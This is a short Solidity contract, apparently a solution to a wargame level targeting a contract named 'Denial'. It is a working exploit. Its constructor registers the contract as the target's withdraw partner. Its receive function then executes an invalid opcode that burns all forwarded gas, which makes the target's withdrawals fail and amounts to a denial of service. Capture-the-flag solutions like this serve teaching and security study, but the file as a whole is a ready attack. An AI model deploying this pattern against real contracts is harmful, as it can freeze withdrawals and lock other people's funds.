// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract GonnaGiveYouMoney {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // while(true){}
        assembly {
            invalid()
        }
    }
}
